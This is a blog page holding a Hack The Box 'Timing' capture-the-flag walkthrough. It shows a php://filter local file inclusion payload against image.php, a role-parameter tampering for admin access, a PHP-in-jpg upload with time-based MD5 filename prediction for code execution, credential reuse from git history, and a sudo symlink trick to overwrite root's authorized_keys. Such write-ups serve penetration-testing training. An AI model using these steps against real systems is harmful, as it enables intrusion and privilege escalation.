<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Timing -Hack The Box | As-Blog</title><meta name=keywords content="CTF">
<meta name=description content="Timing -Hack The Box
Summary
Timing is the Hack The Box boot2root machine which is a fun box with a lot of enumeration. The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter &ldquo;?img=&rdquo; if we pass /etc/passwd the server simply responds with a message &ldquo;hacking detected&rdquo; if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability.">
<meta name=author content="Me">
<link rel=canonical href=https://akhils911dev.github.io/blog/posts/hack-the-box-timing/>
<meta name=google-site-verification content="XYZabc">
<meta name=yandex-verification content="XYZabc">
<meta name=msvalidate.01 content="XYZabc">
<link crossorigin=anonymous href=/blog/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/blog/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://akhils911dev.github.io/blog/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://akhils911dev.github.io/blog/posts/img/favicon.png>
<link rel=icon type=image/png sizes=32x32 href=https://akhils911dev.github.io/blog/favicon-32x32.png>
<link rel=apple-touch-icon href=https://akhils911dev.github.io/blog/%3Clink%20/%20abs%20url%3E>
<link rel=mask-icon href=https://akhils911dev.github.io/blog/%3Clink%20/%20abs%20url%3E>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Timing -Hack The Box">
<meta property="og:description" content="Timing -Hack The Box
Summary
Timing is the Hack The Box boot2root machine which is a fun box with a lot of enumeration. The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter &ldquo;?img=&rdquo; if we pass /etc/passwd the server simply responds with a message &ldquo;hacking detected&rdquo; if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://akhils911dev.github.io/blog/posts/hack-the-box-timing/"><meta property="og:image" content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-02-21T00:00:00+00:00">
<meta property="article:modified_time" content="2022-02-21T00:00:00+00:00"><meta property="og:site_name" content="ExampleSite">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
<meta name=twitter:title content="Timing -Hack The Box">
<meta name=twitter:description content="Timing -Hack The Box
Summary
Timing is the Hack The Box boot2root machine which is a fun box with a lot of enumeration. The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter &ldquo;?img=&rdquo; if we pass /etc/passwd the server simply responds with a message &ldquo;hacking detected&rdquo; if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://akhils911dev.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Timing -Hack The Box","item":"https://akhils911dev.github.io/blog/posts/hack-the-box-timing/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Timing -Hack The Box","name":"Timing -Hack The Box","description":"Timing -Hack The Box\nSummary\nTiming is the Hack The Box boot2root machine which is a fun box with a lot of enumeration. The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter \u0026ldquo;?img=\u0026rdquo; if we pass /etc/passwd the server simply responds with a message \u0026ldquo;hacking detected\u0026rdquo; if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability.","keywords":["CTF"],"articleBody":"Timing -Hack The Box\nSummary\nTiming is the Hack The Box boot2root machine which is a fun box with a lot of enumeration. The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter “?img=” if we pass /etc/passwd the server simply responds with a message “hacking detected” if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability. Reading the /etc/passwd we got the username aaron login the web with credentials aaron:aaron after login it has an edit profile menu which gave them access to the admin panel and allow us to upload image after the uploading the image with php payload we must find the file name and get the RCE, enumerating the server directories we find a backup file in the /opt directory it contains a git repository enumerating the file we find ssh password access the machine through ssh after that abuse the netutils to overwrite the authorized_keys and get root access\nRun the nmap scan:\n# Nmap 7.92 scan initiated Fri Jan 28 23:12:43 2022 as: nmap -sCV -A -o nmapscan.txt 10.10.11.135 Nmap scan report for timing.htb (10.10.11.135) Host is up (0.65s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA) | 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA) |_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Simple WebApp |_Requested resource was ./login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 28 23:14:33 2022 -- 1 IP address (1 host up) scanned in 110.52 seconds Notice the two usual and classic open ports: ssh on port 22 and http on port 80 I immediately put the domain timing.htb in my /etc/hosts file and I also noticed the login.php file name which means it is a PHP server\nNavigating the web http://timing.htb it’s running a simple web app with a login page\nlet’s check hidden files and subdirectory using gobuster\ngobuster dir -u http://timing.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://timing.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2022/01/28 01:56:28 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 275] /.html (Status: 403) [Size: 275] /.html.txt (Status: 403) [Size: 275] /login.php (Status: 200) [Size: 5609] /.html.php (Status: 403) [Size: 275] /images (Status: 301) [Size: 309] [-- http://timing.htb/images/] /js (Status: 301) [Size: 305] [-- http://timing.htb/js/] /index.php (Status: 302) [Size: 0] [-- ./login.php] /css (Status: 301) [Size: 306] [-- http://timing.htb/css/] /.htm (Status: 403) [Size: 275] /.htm.php (Status: 403) [Size: 275] /.htm.txt (Status: 403) [Size: 275] /profile.php (Status: 302) [Size: 0] [-- ./login.php] /logout.php (Status: 302) [Size: 0] [-- ./login.php] /image.php (Status: 200) [Size: 0] /upload.php (Status: 302) [Size: 0] [-- ./login.php] /header.php (Status: 302) [Size: 0] [-- ./login.php] /footer.php (Status: 200) [Size: 3937] /. (Status: 302) [Size: 0] [-- ./login.php] Progress: 1353 / 129012 (1.05%) =============================================================== 2022/01/28 01:58:00 Finished =============================================================== The result is showing an interesting one which is an image.php file accessing the image.php it doesn’t contain body or content\nfuzzing the image.php file parameter using ffuf\nffuf -u http://timing.htb/image.php?FUZZ=/etc/passwd -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0 -mc all   /'___\\ /'___\\ /'___\\  /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/  \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\  \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/  \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\  \\/_/ \\/_/ \\/___/ \\/_/   v1.3.1 Kali Exclusive 3 ________________________________________________   :: Method : GET  :: URL : http://timing.htb/image.php?FUZZ=/etc/passwd  :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt  :: Follow redirects : false  :: Calibration : false  :: Timeout : 10  :: Threads : 40  :: Matcher : Response status: all  :: Filter : Response size: 0 ________________________________________________  img [Status: 200, Size: 25, Words: 3, Lines: 1] [WARN] Caught keyboard interrupt (Ctrl-C) Check the parameter “?img=” with /etc/passwd in burp suite the server sends a response message “hacking detected” which means the server is blocking our request\nI try to bypass the filtering method with php://filter wrappers http://example.com/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd\nit successfully vulnerable to LFI\n┌──(kali㉿vm)-[~/HTB/timing] └─$ echo -n 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK' | base64 -d root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false aaron:x:1000:1000:aaron:/home/aaron:/bin/bash Decoding the base64 encoding data and the user is aaron\nTry to log in the web using default credentials (aaron:aaron)\nwe logged in as user2 and it has an edit profile menu.\nI have already read all the .php files using LFI there is a file called “admin_auth_check.php”. It defines role!=1 no permission to admin panel so role=1 is the admin role. Capture the edit profile request in the burp repeater and then check the response. The response is JSON data with role parameter that is 0\nadmin_auth_check.php\nRespone in Burp repeater\nManipulating the request to add the role parameter role=1\nYes, I successfully change the user role to admin role. After that I refresh the page now I can access the admin panel that allow us to upload images.\nUpload.php which is the backend code for uploading images.\n$upload_dir= \"images/uploads/\";  $file hash uniqid();  $file name = md5('$file hash' time()). [\"name\"]);  $target_file = Supload dir Sfile name;  $error =  $imageFileType = strtolower(pathinfo(Starget_file, PATHINFO_EXTENSION));  if (isset($_POST[\"submit\"])) {  Scheck = getimagesize($_FILES[\"fileToupload\"][\"tmp_name\"]);  if ($check === false) ( Serror = \"Invalid file\":  if (SimageFileType = \"jpg\") {  Serror=\"This extension is not allowed.\"; Above code is what we will look into. Uploaded files will be moved to */images/uploads/’ directory. File Extension must have jpg’, and upon upload the filename will be changed to MD5 sum. The logic behind creating this MD5 sum is, it takes two things as input, $file hash’ and ’time())’ and then adds the base filename of uploaded file to that hash.\n According to PHP, uniqid() function generates a unique ID based on the microtime (the current time in microseconds). In PHP single quote (’) and double quote(\") have different meanings and interpretations.\n  Single quoted strings will display things almost completely “as is.”. Double quote strings will display a host of escaped characters (including some regexes), and variables in the strings will be evaluated.\n So, uniqid() is just a rabbit hole, it is taking sfile hash as string to generate MD5 hash. However, time()) is also being used as factor to generate MDS. It is considering current time in seconds, that means every second will get a new hash.\nWe need to match the upload time to get the right hash. For that we need to make sure our local machine time is not far behind or a head.\n┌──(kali㉿vm)-[~/HTB/timing] └─$ nmap -p80 --script http-date timing.htb Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-18 17:04 GMT Nmap scan report for timing.htb (10.10.11.135) Host is up (0.27s latency).  PORT STATE SERVICE 80/tcp open http |_http-date: Fri, 18 Feb 2022 17:04:43 GMT; +30s from local time.  Nmap done: 1 IP address (1 host up) scanned in 5.19 seconds ┌──(kali㉿vm)-[~/HTB/timing] └─$ date Fri Feb 18 17:04:13 PM GMT 2022 You can check the date and match it with your time using nmap. Target is-16 seconds behind from my local time. You just need to confirm time, make sure to set your time to GMT.\ncat payload.jpg  Create a jpg file with PHP code which can give code execution access. Now we need to start a PHP interactive shell, where we run continuously run PHP code to generate hash based on time and string.\n┌──(kali㉿vm)-[~/HTB/timing] └─$ php -a Interactive shell  php  while (true){echo date(\"D M J G:i:s T y\"); echo \"=\" ; echo md5('$file_hash' . time());echo \"\\n\";sleep(1);} Fri Feb J 17:10:09 UTC 22=46f86e00cdc28dfdd17140ab650f253c Fri Feb J 17:10:10 UTC 22=ae30812a01e35558eb19edb80c0f5f43 Fri Feb J 17:10:11 UTC 22=3c400e04e2dbd18e5b279f8d9f0437e2 Fri Feb J 17:10:12 UTC 22=bc85022b6ba0af3fd2b68116784e981a Fri Feb J 17:10:13 UTC 22=ba90f0d034a883a4bb9f51c2d89b846d Keep it going, do not terminate it. Now we need to upload that recently created jpg file, intercept the upload request, send it to repeater, check the response time and match the time with PHP hash.\nCheck burp response time and find the matching hash of that time from PHP interactive session.\n┌──(kali㉿vm)-[~/HTB/timing] └─$ php -a Interactive shell  php  while (true){echo date(\"D M J G:i:s T y\"); echo \"=\" ; echo md5('$file_hash' . time());echo \"\\n\";sleep(1);} Fri Feb J 17:11:22 UTC 22=08576e1d40eb90b0be4bd88cfb9dfb6e Fri Feb J 17:11:23 UTC 22=aadec32bafe6cc4e5e52af30a272fcc1 Fri Feb J 17:11:24 UTC 22=77a0ca1126765779fd995e6ca385f1ba Fri Feb J 17:11:25 UTC 22=8e055d3f73b750172035beb253c5d2e9 Fri Feb J 17:11:26 UTC 22=dfee1b4cb23db563252d16081c58d098 Fri Feb J 17:11:27 UTC 22=507185ca9da790587f30e3b62f60e2d5 Fri Feb J 17:11:28 UTC 22=bf382cf682d3e9d14e244f68edcba071 The time matched hash is Fri Feb J 17:11:25 UTC 22=8e055d3f73b750172035beb253c5d2e9\nnow let’s excuited our uploaded payload through http://timing.htb/image.php?img=images/uploads/8e055d3f73b750172035beb253c5d2e9_payload.jpg\u0026cmd=id\nHere, we have the RCE we try to get back a reverse shell but we can’t get a shell with the www-data user, it’s like he has outside connections restriction so we try to enumerate the server directory we find a backup file in the opt directory.\nCopy the file to the webserver root directory and get the file to our machine\nUnzip the file it contains the git repository\n┌──(kali㉿vm)-[~/HTB/timing/zip/backup] └─$ ls -la total 76 drwxr-xr-x 6 kali kali 4096 Jul 20 2021 . drwxr-xr-x 3 kali kali 4096 Feb 15 08:12 .. -rw-r--r-- 1 kali kali 200 Jul 20 2021 admin_auth_check.php -rw-r--r-- 1 kali kali 373 Jul 20 2021 auth_check.php -rw-r--r-- 1 kali kali 1268 Jul 20 2021 avatar_uploader.php drwxr-xr-x 2 kali kali 4096 Jul 20 2021 css -rw-r--r-- 1 kali kali 92 Jul 20 2021 db_conn.php -rw-r--r-- 1 kali kali 3937 Jul 20 2021 footer.php drwxr-xr-x 8 kali kali 4096 Feb 15 08:21 .git -rw-r--r-- 1 kali kali 1498 Jul 20 2021 header.php -rw-r--r-- 1 kali kali 507 Jul 20 2021 image.php drwxr-xr-x 3 kali kali 4096 Jul 20 2021 images -rw-r--r-- 1 kali kali 188 Jul 20 2021 index.php drwxr-xr-x 2 kali kali 4096 Jul 20 2021 js -rw-r--r-- 1 kali kali 2074 Jul 20 2021 login.php -rw-r--r-- 1 kali kali 113 Jul 20 2021 logout.php -rw-r--r-- 1 kali kali 3041 Jul 20 2021 profile.php -rw-r--r-- 1 kali kali 1740 Jul 20 2021 profile_update.php -rw-r--r-- 1 kali kali 984 Jul 20 2021 upload.php let’s enumerate the git repository we use the command show which is used to “Show various types of objects”\ngit show commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD - master) Author: grumpy grumpy@localhost.com Date: Tue Jul 20 22:34:13 2021 +0000   db_conn updated  diff --git a/db_conn.php b/db_conn.php index f1c9217..5397ffa 100644 --- a/db_conn.php +++ b/db_conn.php @@ -1,2 +1,2 @@  ?php -$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd'); +$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd'); we discovered two passwords let connect the machine through ssh with these Credentials and user as aaron\nssh aaron@timing.htb aaron@timing.htb's password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)   * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage   System information as of Fri Feb 18 17:50:36 UTC 2022   System load: 0.02 Processes: 184  Usage of /: 50.8% of 4.85GB Users logged in: 0  Memory usage: 20% IP address for eth0: 10.10.11.135  Swap usage: 0%   8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings   Last login: Fri Feb 18 16:02:26 2022 from 10.10.14.113 aaron@timing:~$ls user.txt aaron@timing:~$ cat user.txt ad8d3e305b33cbfce293fc1e0bd47ca9 we got the user flag. Now we need to perform privilege escalation, so let’s check what we can start as a superuser without using the password.\naaron@timing:~$ sudo -l Matching Defaults entries for aaron on timing:  env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User aaron may run the following commands on timing:  (ALL) NOPASSWD: /usr/bin/netutils   aaron@timing:~$ cat /usr/bin/netutils #! /bin/bash java -jar /root/netutils.jar It is running netutils.jar as root. which is inside the root folder so we can’t view that. When we run the program from the root user it gets remote file and saves it with root permission in aaron home directory.\nSo, I decided to create a symbolic link in /root/.ssh/authorized_keys with keys using our public key. when we get the file with the same name it overwrites the authorized_keys.\nlet’s create the ssh key in our machine rename the id_rsa.pub to keys and run a python simple server.\nNow the file is fetched there is no new file created that means our keys file is overwritten to authorized_keys. Let’s login with our id_rsa\npwned\n","wordCount":"2117","inLanguage":"en","datePublished":"2022-02-21T00:00:00Z","dateModified":"2022-02-21T00:00:00Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://akhils911dev.github.io/blog/posts/hack-the-box-timing/"},"publisher":{"@type":"Organization","name":"As-Blog","logo":{"@type":"ImageObject","url":"https://akhils911dev.github.io/blog/favicon.ico"}}}</script>
</head><body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://akhils911dev.github.io/blog/ accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div><ul id=menu>
<li>
<a href=https://akhils911dev.github.io/blog/archives/ title=Archives>
<span>Archives</span>
</a>
</li><li>
<a href=https://akhils911dev.github.io/blog/tags/ title=Tags>
<span>Tags</span>
</a>
</li><li>
<a href=https://akhils911dev.github.io/blog/search/ title=Search>
<span>Search</span>
</a>
</li></ul></nav></header><main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://akhils911dev.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://akhils911dev.github.io/blog/posts/>Posts</a></div><h1 class=post-title>
Timing -Hack The Box
</h1><div class=post-meta><span title="2022-02-21 00:00:00 +0000 UTC">February 21, 2022</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/Hack-The-Box-Timing.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div></header><div class=post-content><p>Timing -Hack The Box</p><p><img loading=lazy src=/blog/posts/img/timing.png alt="Test Image">
</p><p>Summary</p><p>Timing is the Hack The Box boot2root machine which is a fun box with a lot of enumeration.
The machine runs a simple PHP web server. Enumerating the web directory we discovered an image.php file. Fuzzing that PHP file we found a parameter &ldquo;?img=&rdquo; if we pass /etc/passwd the server simply responds with a message &ldquo;hacking detected&rdquo; if we use a php wrapper with base64 encoding we will have a successful LFI Vulnerability. Reading the /etc/passwd we got the username aaron login the web with credentials aaron:aaron after login it has an edit profile menu which gave them access to the admin panel and allow us to upload image after the uploading the image with php payload we must find the file name and get the RCE, enumerating the server directories we find a backup file in the /opt directory it contains a git repository enumerating the file we find ssh password access the machine through ssh after that abuse the netutils to overwrite the authorized_keys and get root access</p><p>Run the nmap scan:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span># Nmap 7.92 scan initiated Fri Jan 28 23:12:43 2022 as: nmap -sCV -A -o nmapscan.txt 10.10.11.135
</span></span><span style=display:flex><span>Nmap scan report for timing.htb (10.10.11.135)
</span></span><span style=display:flex><span>Host is up (0.65s latency).
</span></span><span style=display:flex><span>Not shown: 998 closed tcp ports (conn-refused)
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
</span></span><span style=display:flex><span>|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
</span></span><span style=display:flex><span>|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style=display:flex><span>| http-title: Simple WebApp
</span></span><span style=display:flex><span>|_Requested resource was ./login.php
</span></span><span style=display:flex><span>| http-cookie-flags: 
</span></span><span style=display:flex><span>|   /: 
